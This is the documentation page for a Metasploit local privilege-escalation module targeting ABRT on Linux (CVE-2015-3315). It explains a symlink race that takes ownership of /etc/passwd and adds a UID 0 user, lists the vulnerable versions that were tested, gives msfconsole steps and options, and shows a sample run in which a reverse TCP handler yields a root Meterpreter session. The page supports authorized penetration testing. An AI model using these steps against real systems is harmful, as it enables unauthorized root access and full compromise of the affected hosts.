## Description

  This module attempts to gain root privileges on Linux systems with
  a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured
  as the crash handler.


## Vulnerable Application

  A race condition allows local users to change ownership of arbitrary
  files (CVE-2015-3315). This module uses a symlink attack on
  `/var/tmp/abrt/*/maps` to change the ownership of `/etc/passwd`,
  then adds a new user with UID=0 GID=0 to gain root privileges.
  Winning the race could take a few minutes.

  This module has been tested successfully on:

  * abrt 2.1.11-12.el7 on RHEL 7.0 x86_64
  * abrt 2.1.5-1.fc19 on Fedora Desktop 19 x86_64
  * abrt 2.2.1-1.fc19 on Fedora Desktop 19 x86_64
  * abrt 2.2.2-2.fc20 on Fedora Desktop 20 x86_64
  * abrt 2.3.0-3.fc21 on Fedora Desktop 21 x86_64


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Do: `use exploit/linux/local/abrt_raceabrt_priv_esc`
  4. Do: `set SESSION [SESSION]`
  5. Do: `check`
  6. Do: `run`
  7. You should get a new *root* session


## Options

  **USERNAME**

  Username for the new UID=0 user (default: random)

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **WritableDir**

  A writable directory file system path. (default: `/tmp`)


## Scenarios

  ```
  msf > use exploit/linux/local/abrt_raceabrt_priv_esc 
  msf exploit(linux/local/abrt_raceabrt_priv_esc) > set session 1
  session => 1
  msf exploit(linux/local/abrt_raceabrt_priv_esc) > run

  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 172.16.191.244:4444 
  [*] Writing '/tmp/.C17d3UYQy' (64240 bytes) ...
  [*] Trying to own '/etc/passwd' - This might take a few minutes (Timeout: 900s) ...
  [+] Success! '/etc/passwd' is writable
  [*] Adding pauITBusGM user to /etc/passwd ...
  [*] Writing '/tmp/.u8zOz4c' (207 bytes) ...
  [*] Sending stage (857352 bytes) to 172.16.191.137
  [*] Meterpreter session 2 opened (172.16.191.244:4444 -> 172.16.191.137:38938) at 2018-02-03 21:29:56 -0500

  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : localhost.localdomain
  OS           : Fedora 20 (Linux 3.19.8-100.fc20.x86_64)
  Architecture : x64
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  meterpreter > 
  ```

